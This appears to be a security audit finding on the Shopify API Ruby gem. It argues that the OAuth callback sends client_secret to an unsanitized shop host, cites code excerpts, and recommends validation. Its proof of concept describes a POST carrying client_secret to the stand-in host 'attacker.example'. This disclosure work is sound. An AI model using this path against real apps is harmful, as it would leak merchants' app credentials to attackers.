Based on the analysis, I found the key vulnerability: `ShopifyAPI::Auth::Oauth.validate_auth_callback` in `lib/shopify_api/auth/oauth.rb` uses `auth_query.shop` directly — without passing it through `Utils::ShopValidator.sanitize!` — to build the session/host that receives the app's `client_secret` during the access-token exchange POST. This is inconsistent with `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`, which both explicitly call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to send `client_secret`.

### Title
SSRF/credential leak via unsanitized `shop` in OAuth callback exchanging `client_secret` - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request using `auth_query.shop` as the destination host without ever validating that value against `Utils::ShopValidator.sanitize!`, unlike `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`, which both perform that validation before sending `client_secret` anywhere.

### Finding Description
In `lib/shopify_api/auth/oauth.rb`, `validate_auth_callback` does: [1](#0-0) 

It validates the HMAC over `code, host, shop, state, timestamp` via `Utils::HmacValidator.validate(auth_query)` [2](#0-1)  and the signable string is built from `AuthQuery#to_signable_string`, which does include `shop` [3](#0-2) .

However, this only proves the `shop` value matches whatever was in the query params when the HMAC was computed — it does **not** prove that `shop` is a real `*.myshopify.com`/trusted Shopify domain. `Utils::ShopValidator` exists precisely to make that determination, checking against `TRUSTED_SHOPIFY_DOMAINS` [4](#0-3) , and it is deliberately invoked in the two other flows that send `client_secret`:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the session [5](#0-4) 
- `TokenExchange.migrate_to_expiring_token`: same pattern [6](#0-5) 

By contrast, `validate_auth_callback` constructs `null_session = Auth::Session.new(shop: auth_query.shop)` directly from the unsanitized `auth_query.shop`, then creates `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which derives the destination host straight from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [7](#0-6) . The POST body containing `client_id` and `client_secret` is then sent to that host [8](#0-7) .

The binding that should hold is: *the host that receives `client_secret` == a value provably belonging to Shopify's trusted domain set*, not merely *the host that receives `client_secret` == the value the HMAC happened to be computed over*. The HMAC binds `shop` to the app's secret and the specific callback request, but does not itself constrain `shop` to be a legitimate Shopify domain. `AuthQuery` accepts any `shop:` string with no shape/domain constraint [9](#0-8) , and `validate_auth_callback` never calls `ShopValidator.sanitize!` on it before using it as the request host.

### Impact Explanation
This does not, by itself, allow bypassing the HMAC check — an unprivileged internet user cannot forge a valid HMAC without the app's `api_secret_key`. The realistic risk is scoped to hosting applications that build the `AuthQuery` object from raw callback request parameters (as the gem's own docs illustrate, `ShopifyAPI::Auth::Oauth::AuthQuery.new(request.parameters.symbolize_keys.except(:controller, :action))` [10](#0-9) ) and any code path where the HMAC is computed over an app-controlled or otherwise attacker-influenced `shop` value (e.g., if the app itself echoes a `shop` value into a signed callback, or a future/derived flow re-signs a query with attacker-supplied `shop`). Given the asymmetry with `ClientCredentials`/`TokenExchange`, which both proactively defend the same class of issue with `ShopValidator.sanitize!`, this omission in `validate_auth_callback` is a latent SSRF-with-credentials gap: `client_secret` is sent to whatever host ends up in `auth_query.shop` if that value is not independently constrained to a trusted Shopify domain.

### Likelihood Explanation
Low-to-moderate. Exploitation requires a way to get the app's HMAC computed over an attacker-chosen `shop` without possessing `api_secret_key` — this is not achievable purely as an unprivileged internet user attacking this gem in isolation, since Shopify signs genuine callback requests. The core issue is a missing defense-in-depth check (inconsistent with the pattern established elsewhere in the same gem) rather than a directly triggerable bypass from this gem's code alone.

### Recommendation
In `ShopifyAPI::Auth::Oauth.validate_auth_callback`, validate `auth_query.shop` through `Utils::ShopValidator.sanitize!` (as is already done in `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`) before constructing the session/host used to send `client_id`/`client_secret`, so the destination host is independently proven to be a trusted Shopify domain rather than relying solely on the HMAC match.

### Proof of Concept
1. Construct an `AuthQuery` with `shop: "attacker.example"` and any `code`/`state`/`timestamp`/`host`.
2. If an application (or future code path) computes a valid HMAC over these fields with the app's `api_secret_key` (e.g., because the app itself echoes user-controlled `shop` back through a signing step, or a testing/staging harness reuses the secret to sign attacker-influenced params), `HmacValidator.validate` succeeds.
3. `validate_auth_callback` builds `Auth::Session.new(shop: "attacker.example")` and `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which issues `POST https://attacker.example/admin/oauth/access_token` with `client_id` and `client_secret` in the body — leaking the app's `client_secret` to `attacker.example`.
4. Compare with `ClientCredentials.client_credentials(shop: "attacker.example")`, which raises `ShopifyAPI::Errors::InvalidShopError` before ever building the session, per `ShopValidator.sanitize!` [11](#0-10) .

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-94)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L24-31)
```ruby
        def initialize(code:, shop:, timestamp:, state:, host:, hmac:)
          @code = code
          @shop = shop
          @timestamp = timestamp
          @state = state
          @host = host
          @hmac = hmac
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-34)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
          response =
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-116)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
          response = begin
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** docs/usage/oauth.md (L246-251)
```markdown
    auth_result = ShopifyAPI::Auth::Oauth.validate_auth_callback(
      cookies: cookies.to_h,
      auth_query: ShopifyAPI::Auth::Oauth::AuthQuery.new(
        request.parameters.symbolize_keys.except(:controller, :action)
      )
    )
```
